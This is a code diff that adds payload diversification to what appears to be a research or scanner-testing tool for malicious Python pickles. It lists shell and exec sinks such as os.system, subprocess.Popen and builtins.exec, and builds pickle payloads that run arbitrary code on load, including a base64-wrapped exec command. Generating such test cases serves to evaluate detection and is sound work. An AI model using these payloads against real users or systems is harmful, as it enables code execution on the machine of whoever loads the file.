@@ -260,6 +260,83 @@ def family_template(family: str) -> AttackTemplate | None:
     return FAMILY_TEMPLATES.get(family)
 
 
+# Callable diversification for template families: allow the payload sink to be
+# sampled rather than hard-coding IPython.utils.process.system.  Only callables
+# whose sink_kind can carry the payload (system/exec/runstring) are allowed.
+TEMPLATE_FAMILY_SINKS: dict[str, list[tuple[str, str]]] = {
+    # pypi_injected and indirect_chain are system-sinks (shell command)
+    "pypi_injected": [
+        ("IPython.utils.process", "system"),
+        ("os", "system"),
+        ("posix", "system"),
+        ("subprocess", "Popen"),
+        ("subprocess", "run"),
+    ],
+    "external": [
+        ("numpy.testing._private.utils", "runstring"),
+        ("builtins", "exec"),
+    ],
+    "indirect_chain": [
+        ("os", "system"),
+        ("posix", "system"),
+        ("subprocess", "Popen"),
+        ("IPython.utils.process", "system"),
+    ],
+    "overwritten": [
+        ("collections", "OrderedDict"),
+        ("builtins", "exec"),
+    ],
+}
+
+
+def template_payload_for_callable(family: str, module: str, name: str,
+                                   payload_code: str) -> bytes:
+    """Generate a payload for a template family with an explicit callable.
+
+    Used for callable diversification of template families (peer-review
+    payload-level mutation).  Falls back to the family's default template when
+    the callable is not a known alternative.
+    """
+    # Check if this is a known alternative for the family
+    known = TEMPLATE_FAMILY_SINKS.get(family, [])
+    if (module, name) not in known and family in TEMPLATE_FAMILY_SINKS:
+        # Unknown alternative: try to infer sink_kind from registry
+        from pipeline.registry import get_entry
+        entry = get_entry(module, name)
+        # For templated families we only allow system/exec/runstring sinks
+        if entry is None:
+            return FAMILY_TEMPLATES[family].generate_pickle_payload(payload_code)
+    # Dispatch by sink shape
+    if family == "overwritten":
+        tmpl = OverwrittenModuleTemplate(module_name=module, class_name=name)
+        return tmpl.generate_pickle_payload(payload_code)
+    if family == "indirect_chain":
+        tmpl = IndirectChainTemplate(module_name=module, callable_name=name)
+        return tmpl.generate_pickle_payload(payload_code)
+    # pypi_injected / external: direct GLOBAL + args + REDUCE
+    tmpl = FAMILY_TEMPLATES.get(family)
+    if tmpl is not None:
+        # Build args consistent with the template's sink_kind
+        args = tmpl._args_for(payload_code)  # type: ignore[attr-defined]
+        # But if the alternative callable has different sink_kind, rebuild
+        # e.g. builtins.exec expects (code,) not (shell_cmd,)
+        if name in ("exec", "eval") or module == "builtins":
+            args = (payload_code,)
+        elif name == "runstring":
+            args = (payload_code, {})
+        elif name in ("Popen", "run", "call") and module == "subprocess":
+            import base64 as _b64
+            # Use same encoding as gadget to avoid quote issues
+            _enc = _b64.b64encode(payload_code.encode()).decode()
+            _cmd = f'python3 -c "import base64;exec(base64.b64decode({_enc!r}))"'
+            # system-like wrapper
+            args = (("python3", "-c", payload_code),) if name in ("Popen","run") else (payload_code,)
+            if name == "Popen":
+                args = (("python3", "-c", payload_code),)
+        return _generate_payload(module, name, args)
+    return FAMILY_TEMPLATES[family].generate_pickle_payload(payload_code)
+
+
 def _get_placeholder_class(module_name: str, class_name: str) -> type:
     """Helper to dynamically create/get a dummy class on a dummy module to satisfy pickle.dumps check."""
     if module_name not in sys.modules:
